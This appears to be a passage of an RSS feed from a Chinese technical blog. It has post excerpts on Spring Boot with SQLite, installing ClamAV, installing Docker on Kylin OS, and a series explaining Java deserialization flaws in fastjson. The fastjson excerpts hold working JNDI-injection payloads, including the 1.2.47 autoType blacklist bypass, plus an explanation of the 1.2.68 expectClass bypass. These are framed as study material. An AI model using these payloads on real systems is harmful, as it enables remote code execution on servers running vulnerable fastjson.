&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">url&lt;/span>: jdbc:sqlite:data/kafka-map.db
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">driver-class-name&lt;/span>: org.sqlite.JDBC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">jpa&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">hibernate&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">ddl-auto&lt;/span>: update
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">show-sql&lt;/span>: &lt;span style="color:#ff79c6">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">properties&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">hibernate&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">dialect&lt;/span>: org.hibernate.community.dialect.SQLiteDialect
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="原生二进制打包">原生二进制打包&lt;/h2>
&lt;p>打包原生二进制还是最折腾的，刚开始参考&lt;a href="https://docs.spring.io/spring-boot/docs/3.0.0/reference/html/native-image.html#native-image.developing-your-first-application.buildpacks">GraalVM Native Image Support&lt;/a> 把打包 &lt;code>springboot:build-image&lt;/code> 当成了打包原生二进制了，而且打包的过程中还遇到了 &lt;code>UnsupportedFeatureException: No instances of ch.qos.logback.classic.Logger&lt;/code> 这个问题，找了一圈也没找到解决方案。&lt;/p></description></item><item><title>Linux 杀毒软件 ClamAV 安装</title><link>https://www.typesafe.cn/posts/clamav-install/</link><pubDate>Mon, 07 Mar 2022 21:52:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/clamav-install/</guid><description>&lt;p>&lt;strong>Clam AntiVirus&lt;/strong>（&lt;strong>ClamAV&lt;/strong>）是免费而且开放源代码的杀毒软件，软件与病毒码的更新皆由社群免费发布。Github 地址：https://github.com/Cisco-Talos/clamav&lt;/p>
&lt;h3 id="安装-clamav">安装 ClamAV&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install -y clamav*
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="配置-clamav">配置 ClamAV&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cat &amp;gt; /etc/freshclam.conf &lt;span style="color:#f1fa8c">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c"># 数据库配置文件夹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">DatabaseDirectory /var/lib/clamav
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c"># 更新日志文件夹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">UpdateLogFile /var/log/freshclam.log
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c"># 日志大小
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">LogFileMaxSize 2M
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c"># 日志记录时间
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">LogTime yes
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c"># 所属用户
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">DatabaseOwner root
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c"># 同步病毒库的地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">DatabaseMirror database.clamav.net
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="更新病毒库">更新病毒库&lt;/h3>
&lt;p>大概需要几分钟时间&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>freshclam
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="进行病毒扫描测试">进行病毒扫描测试&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>clamscan -ri &amp;lt;/path1/to/scan&amp;gt; &amp;lt;/path2/to/scan&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>常用配置说明&lt;/p>
&lt;pre tabindex="0">&lt;code>--recursive[=yes/no(*)] -r 递归查找
--infected -I 只打印受影响的文件信息
--remove[=yes/no(*)] 删除受影响的文件。(不建议使用,根据扫描结果进行手动删除,避免误删。)
&lt;/code>&lt;/pre>&lt;h3 id="配置邮箱">配置邮箱&lt;/h3>
&lt;p>如果不需要邮件通知的可以忽略此步骤。&lt;/p>
&lt;h4 id="安装邮件服务">安装邮件服务&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install -y mailx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="修改配置">修改配置&lt;/h4>
&lt;p>修改大写字母为你的邮箱配置&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cat &amp;gt; /etc/mail.rc &lt;span style="color:#f1fa8c">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set from=USERNAME@YOURDOMAIN.COM
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set smtp=smtps://smtp.exmail.qq.com:465
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set smtp-auth=login
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set smtp-auth-user=USERNAME@YOURDOMAIN.COM
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set smtp-auth-password=YOURPASSWORD
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set ssl-verify=ignore
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">set nss-config-dir=/etc/pki/nssdb/
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f1fa8c">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="发送邮件进行测试">发送邮件进行测试&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">echo&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Your message&amp;#34;&lt;/span> | mail -v -s &lt;span style="color:#f1fa8c">&amp;#34;Message Subject&amp;#34;&lt;/span> email@address
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果出现 “Error in certificate: Peer&amp;rsquo;s certificate issuer is not recognized” 属于正常。&lt;/p></description></item><item><title>在银河麒麟高级服务器操作系统V10上安装docker</title><link>https://www.typesafe.cn/posts/install-docker-on-kylinos/</link><pubDate>Tue, 21 Dec 2021 23:39:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/install-docker-on-kylinos/</guid><description>&lt;blockquote>
&lt;p>银河麒麟高级服务器操作系统 V10 是针对企业级关键业务，适应虚拟化、 云计算、大数据、工业互联网时代对主机系统可靠性、安全性、性能、扩展性和 实时性的需求，依据 CMMI 5 级标准研制的提供内生安全、云原生支持、国产 平台深入优化、高性能、易管理的新一代自主服务器操作系统；同源支持飞腾、 龙芯、申威、兆芯、海光、鲲鹏等自主平台；可支撑构建大型数据中心服务器高 可用集群、负载均衡集群、分布式集群文件系统、虚拟化应用和容器云平台等， 可部署在物理服务器和虚拟化环境、私有云、公有云和混合云环境；应用于政府、 国防、金融、教育、财税、公安、审计、交通、医疗、制造等领域。&lt;/p>&lt;/blockquote>
&lt;p>公司有个项目需要将系统部署在 &lt;strong>kylinos&lt;/strong>上，刚开始还有点头疼，害怕各种程序无法安装和使用，等安装好服务器进行使用的时候发现这不就是基于centos的嘛，虽然基于哪个版本不知道，但是可以测试的，于是我一顿操作，最后发现它是基于Centos8的，系统内核版本是 4.19，问题不大，既然是基于Centos8的，那Centos8上能跑的程序，在这肯定也能跑，然后我就开始了愉快（痛苦）的安装docker之旅了。&lt;/p>
&lt;h3 id="配置阿里云centos8镜像源">配置阿里云Centos8镜像源&lt;/h3>
&lt;p>之所以要配置 Centos8 的镜像源是因为在安装docker的时候需要额外的一些依赖，而这些依赖在麒麟官方的源里面是没有的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="配置阿里云-docker-镜像源">配置阿里云 docker 镜像源&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -i &lt;span style="color:#f1fa8c">&amp;#39;s+download.docker.com+mirrors.aliyun.com/docker-ce+&amp;#39;&lt;/span> /etc/yum.repos.d/docker-ce.repo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="定义-yum-变量修改-repo">定义 yum 变量&amp;amp;修改 repo&lt;/h3>
&lt;p>修改 centos 和 docker &lt;code>repo&lt;/code>文件中的 &lt;code>$releasever&lt;/code> 为 &lt;code>centos_version&lt;/code> ，原因是在麒麟服务器操作系统V10中 &lt;code>$releasever&lt;/code>被修改为了 10，而我们需要使用 centos 8的镜像源，如果你不替换，基本上仓库的每一个地址都是404。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">echo&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;8&amp;#34;&lt;/span> &amp;gt; /etc/yum/vars/centos_version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -i &lt;span style="color:#f1fa8c">&amp;#39;s/$releasever/$centos_version/g&amp;#39;&lt;/span> /etc/yum.repos.d/docker-ce.repo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -i &lt;span style="color:#f1fa8c">&amp;#39;s/$releasever/$centos_version/g&amp;#39;&lt;/span> /etc/yum.repos.d/CentOS-Base.repo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="建立yum缓存">建立yum缓存&lt;/h3>
&lt;p>没啥可说的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum makecache
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="查看docker-ce-版本">查看docker-ce 版本&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum list docker-ce --showduplicates | sort -r
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.9-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.8-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.7-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.6-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.5-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.4-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.3-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.2-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.1-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.12-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.11-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.10-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:20.10.0-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:19.03.15-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:19.03.15-3.el8 @docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:19.03.14-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker-ce.x86_64 3:19.03.13-3.el8 docker-ce-stable
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="安装docker">安装docker&lt;/h3>
&lt;p>这里要安装 docker-ce 19.03 版本，因为我在使用最新版 20.10 启动容器时出现了未知的权限问题，而麒麟服务器操作系统资料相对较少，我未能找到相应的解决方案，只好退而求其次，换到上一个稳定版本。&lt;/p></description></item><item><title>Java 反序列化漏洞原理（六）fastjson 1.2.68 绕过原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</link><pubDate>Sat, 06 Nov 2021 17:16:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="fastjson--1268-expectclass-绕过原理">Fastjson &amp;lt;= 1.2.68 expectClass 绕过原理&lt;/h2>
&lt;p>当 fastjson 更新到 1.2.68 之后，大部分安全漏洞都已经封堵住了，但不排除还有人手里握着一些 0day 没有放出来。&lt;/p>
&lt;p>fastjson 1.2.68 在进行反序列化的时候，会进入 &lt;code>ObjectDeserializer&lt;/code> 的 &lt;code>deserialze&lt;/code> 方法，而 安全人员发现 当 &lt;code>@type&lt;/code> 为 &lt;code>java.lang.AutoCloseable&lt;/code> 的时候会找到实现类 &lt;code>JavaBeanDeserializer&lt;/code> 调用 &lt;code>deserialze&lt;/code>，而 &lt;code>JavaBeanDeserializer&lt;/code> 的 &lt;code>deserialze&lt;/code> 方法还会继续解析得到第二个 &lt;code>@type&lt;/code> 对应的值进行反序列化，并且 &lt;code>expectClass&lt;/code> 则不再是 &lt;code>null&lt;/code> 值，而是 &lt;code>java.lang.AutoCloseable&lt;/code>。&lt;/p>
&lt;p>&lt;code>JavaBeanDeserializer&lt;/code> 的 &lt;code>deserialze&lt;/code> 部分代码示例。&lt;/p>
&lt;pre tabindex="0">&lt;code>if (lexer.token() == JSONToken.LITERAL_STRING) {
 // 第二个 @type 的值
 String typeName = lexer.stringVal();
 lexer.nextToken(JSONToken.COMMA);

 if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) {
 if (lexer.token() == JSONToken.RBRACE) {
 lexer.nextToken();
 break;
 }
 continue;
 }
 
 // 这里没有获取到 deserializer
 ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName);
 Class&amp;lt;?&amp;gt; userType = null;

 if (deserializer == null) {
 // 第一个 @type 的值 
 Class&amp;lt;?&amp;gt; expectClass = TypeUtils.getClass(type);
 // 在包含 expectClass 时会绕过
 userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());
 deserializer = parser.getConfig().getDeserializer(userType);
 }
 
 // 再次进行反序列化，会触发反射构造实例
 Object typedObject = deserializer.deserialze(parser, userType, fieldName);
 if (deserializer instanceof JavaBeanDeserializer) {
 JavaBeanDeserializer javaBeanDeserializer = (JavaBeanDeserializer) deserializer;
 if (typeKey != null) {
 FieldDeserializer typeKeyFieldDeser = javaBeanDeserializer.getFieldDeserializer(typeKey);
 if (typeKeyFieldDeser != null) {
 typeKeyFieldDeser.setValue(typedObject, typeName);
 }
 }
 }
 return (T) typedObject;
}
&lt;/code>&lt;/pre>&lt;p>&lt;code>ParseConfig&lt;/code> 的 &lt;code>checkAutoType&lt;/code> 部分代码示例，只要第二个 &lt;code>@type&lt;/code> 继承了 第一个 &lt;code>@type&lt;/code> 即可触发。&lt;/p></description></item><item><title>Java 反序列化漏洞原理（五）fastjson 1.2.47 绕过原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-5/</link><pubDate>Sun, 31 Oct 2021 21:31:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-5/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="fastjson--1247-poc">Fastjson &amp;lt;= 1.2.47 POC&lt;/h2>
&lt;p>随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。&lt;/p>
&lt;p>我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.alibaba.fastjson.JSON;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval3&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#50fa7b">parse&lt;/span>(payload);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>不出意料的话会出现这样的错误提示信息：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>autoType is not support. com.sun.rowset.JdbcRowSetImpl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是因为 fastjson 使用了黑名单机制，禁止将 &lt;code>com.sun.rowset.JdbcRowSetImpl&lt;/code> 反序列化。&lt;/p>
&lt;p>下面我们使用新的 POC 进行测试，又可以利用成功了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.alibaba.fastjson.JSON;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval5&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#50fa7b">parse&lt;/span>(payload);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>payload 格式化之后如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f1fa8c">&amp;#34;a&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;java.lang.Class&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;val&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	},
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f1fa8c">&amp;#34;b&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;dataSourceName&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;rmi://localhost:1099/Exploit&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;autoCommit&amp;#34;&lt;/span>: &lt;span style="color:#ff79c6">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="fastjson--1247-绕过原理">Fastjson &amp;lt;= 1.2.47 绕过原理&lt;/h2>
&lt;p>在学习绕过原理之前，了解 fastjson 的基本解析流程还是有必要的，我画了一张类图仅供参考，图中只画了主要流程，还有很多类没有画。&lt;/p></description></item><item><title>Java 反序列化漏洞原理（四）JNDI + RMI/LDAP 在fastjson中的利用原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-4/</link><pubDate>Sat, 30 Oct 2021 13:43:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-4/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="jndi-是什么">JNDI 是什么&lt;/h2>
&lt;p>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。&lt;/p>
&lt;p>JNDI 包含在Java SE中，不需要引用第三方jar即可使用。要使用 JNDI 必须要有一个或多个服务提供者。JDK 本身已经包括了下面几种服务提供者。&lt;/p>
&lt;ul>
&lt;li>轻量级目录访问协议 (LDAP)&lt;/li>
&lt;li>CORBA 公共对象服务命名（COS naming）&lt;/li>
&lt;li>Java 远程方法调用 (RMI)&lt;/li>
&lt;li>域名服务 (DNS)&lt;/li>
&lt;/ul>
&lt;p>这么说起来还是有点抽象，简单理解就是&lt;strong>服务提供者&lt;/strong>提供一个类似Key Value的数据，&lt;strong>JNDI&lt;/strong>可以通过这个 Key 获取到&lt;strong>服务提供者&lt;/strong>上的提供的Value，因此JNDI是无法单独使用的。&lt;/p>
&lt;p>使用JNDI的方式也很简单，下面就是一个获取远程对象的示例代码。&lt;/p>
&lt;pre tabindex="0">&lt;code>// 创建一个上下文对象
InitialContext context = new InitialContext();
// 查找监听在本地 1099 端口上 RMI 服务的 Object 对象
Object obj = context.lookup(&amp;#34;rmi://localhost:1099/Object&amp;#34;);
&lt;/code>&lt;/pre>&lt;h2 id="rmi-是什么">RMI 是什么&lt;/h2>
